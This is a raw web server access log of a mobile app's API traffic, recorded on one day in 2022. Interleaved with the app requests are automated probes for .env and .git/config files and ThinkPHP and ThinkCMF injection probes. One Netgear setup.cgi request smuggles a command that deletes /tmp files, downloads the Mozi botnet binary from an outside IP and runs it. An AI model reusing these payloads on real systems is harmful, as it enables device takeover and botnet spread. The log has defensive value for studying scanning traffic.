::1 - - [09/Sep/2022:08:03:00 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:08:03:13 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [09/Sep/2022:08:03:13 +0000] "GET /api/v1/goods/62f8b8d68e470b4b6899c053 HTTP/1.0" 200 439 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:08:03:13 +0000] "GET /api/v1/transactions/user?good=62f8b8d68e470b4b6899c053&sort=-createdAt HTTP/1.0" 200 1514 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [09/Sep/2022:08:03:16 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:03:16 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:03:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:03:18 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:03:18 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:03:19 +0000] "GET /api/v1/goods/user HTTP/1.0" 200 1111 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:04:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:04:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:04:05 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:04:05 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:04:05 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:05:36 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:08:05:36 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:08:06:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:06:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:06:30 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:06:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:06:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:07:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:07:51 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:07:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:07:54 +0000] "POST /api/v1/transactions HTTP/1.0" 200 256 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:07:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 456 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:07:54 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 456 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:09:07 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:08:09:08 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:08:12:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:12:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:15:46 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:19:22 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:22:07 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 1387 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:22:23 +0000] "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [09/Sep/2022:08:24:27 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 1324 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:26:28 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 1223 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:27:11 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:37:49 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:37:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:37:52 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:39:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:39:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:39:35 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:39:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:39:37 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:39:37 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:40:49 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:40:49 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:41:26 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:42:11 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:08:46:02 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [09/Sep/2022:08:47:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:47:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:47:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:47:31 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:47:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:47:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:47:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:47:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:48:07 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:48:07 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:48:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:48:11 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:48:11 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:48:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:48:13 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:48:16 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:48:16 +0000] "GET /api/v1/transactions/user?template=62fbbcbbfd2881af5a4e55cb HTTP/1.0" 200 1162 "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:48:21 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:48:26 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:08:48:29 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:08:48:29 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:09:01:16 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:09:01:16 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:09:01:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:09:01:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:09:01:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::1 - - [09/Sep/2022:09:01:33 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1335.0.3 Darwin/21.6.0"
::ffff:127.0.0.1 - - [09/Sep/2022:09:03:30 +0000] "GET / HTTP/1.0" 404 139 "-" "<title>(.*?)</title>"
::1 - - [09/Sep/2022:09:08:50 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:09:10:50 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:09:10:51 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:09:53:52 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::1 - - [09/Sep/2022:10:10:43 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:10:10:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:10:27:05 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:10:27:06 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:10:27:43 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:10:46:28 +0000] "GET /actuator/gateway/routes HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [09/Sep/2022:11:05:47 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:11:05:49 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:11:19:53 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:11:19:53 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:12:28:44 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:12:28:44 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:12:38:31 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:12:38:32 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "-"
::1 - - [09/Sep/2022:12:38:32 +0000] "GET /sitemap.xml HTTP/1.0" 404 150 "-" "-"
::ffff:127.0.0.1 - - [09/Sep/2022:12:38:33 +0000] "GET /.well-known/security.txt HTTP/1.0" 404 163 "-" "-"
::1 - - [09/Sep/2022:12:38:33 +0000] "GET /favicon.ico HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
::ffff:127.0.0.1 - - [09/Sep/2022:12:59:28 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
::1 - - [09/Sep/2022:13:08:16 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:13:08:17 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:13:18:55 +0000] "GET /.git/config HTTP/1.0" 404 150 "-" "python-requests/2.28.1"
::ffff:127.0.0.1 - - [09/Sep/2022:14:04:50 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:14:04:52 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:14:17:19 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:14:17:20 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:14:43:03 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.0" 404 169 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:14:56:00 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::1 - - [09/Sep/2022:14:56:41 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://115.58.191.231:50246/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::ffff:127.0.0.1 - - [09/Sep/2022:15:06:43 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:15:06:43 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:15:10:06 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::1 - - [09/Sep/2022:15:37:25 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [09/Sep/2022:15:55:46 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:15:55:47 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:16:12:08 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [09/Sep/2022:16:24:34 +0000] "GET /actuator/gateway/routes HTTP/1.0" 404 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:17:00:19 +0000] "GET / HTTP/1.0" 404 139 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::1 - - [09/Sep/2022:17:04:52 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:17:05:26 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:17:05:27 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:17:16:14 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:17:16:15 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:17:25:01 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [09/Sep/2022:17:25:02 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [09/Sep/2022:17:30:53 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::1 - - [09/Sep/2022:17:53:42 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
